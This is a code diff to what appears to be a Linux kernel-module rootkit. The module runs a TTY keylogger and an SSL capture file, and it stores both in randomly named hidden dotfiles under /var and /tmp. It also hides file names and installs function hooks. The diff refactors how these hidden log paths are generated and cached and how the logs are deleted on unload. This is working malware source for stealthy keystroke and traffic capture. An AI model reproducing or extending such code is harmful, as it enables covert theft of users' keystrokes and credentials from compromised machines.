@@ -705,25 +705,14 @@ static void _keylog_cleanup_list(void) {
     }
 }
 
-static bool _rm_tty_log = true;
-void kv_keylog_rm_log(bool rm_log) {
-    _rm_tty_log = rm_log;
-}
-
-static void _keylog_close_file(void) {
-    fs_kernel_close_file(ttyfilp);
-    ttyfilp = NULL;
-}
-
 void _keylog_cleanup(void) {
     char *tty;
 
     _keylog_cleanup_list();
-    _keylog_close_file();
+    fs_kernel_close_file(ttyfilp);
+    fs_file_rm(sys_ttyfile());
 
-    tty = sys_ttyfile();
-    if (tty && _rm_tty_log && fs_file_rm(tty))
-        prerr("Error removing %s\n", tty);
+    ttyfilp = NULL;
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
@@ -1035,9 +1024,8 @@ static char *_sys_file(char *prefix, char *file, int len) {
     if (*file == 0) {
         char s[8] = {0};
 
-        *s = '.';
-        snprintf(&s[1], 7, "%s", kv_util_random_AZ_string(7));
-        snprintf(file, len-1, "/var/%s", s);
+        snprintf(&s[0], 7, "%s", kv_util_random_AZ_string(7));
+        snprintf(file, len-1, "%s%s", prefix, s);
         {
             const char *tmp[] = {s,NULL};
             fs_add_name_ro(tmp, 0);
@@ -1049,13 +1037,21 @@ static char *_sys_file(char *prefix, char *file, int len) {
 }
 
 char *sys_ttyfile(void) {
-    static char tty[16];
-    return _sys_file("var", tty, sizeof(tty));
+    static char file[16] = {0};
+    if (*file == '\0') {
+        if (!_sys_file("/var/.", file, 16))
+            return NULL;
+    }
+    return file;
 }
 
 char *sys_sslfile(void) {
-    static char ssl[16];
-    return _sys_file("tmp", ssl, sizeof(ssl));
+    static char file[16] = {0};
+    if (*file == '\0') {
+        if (!_sys_file("/tmp/.", file, 16))
+            return NULL;
+    }
+    return file;
 }
 
 bool sys_init(void) {
@@ -1082,12 +1078,9 @@ bool sys_init(void) {
 
 void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
-    char *ssl = sys_sslfile();
-
-    if (ssl)
-        fs_file_rm(ssl);
 
     fh_remove_hooks(ft_hooks);
+    fs_file_rm(sys_sslfile());
     _keylog_cleanup();
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
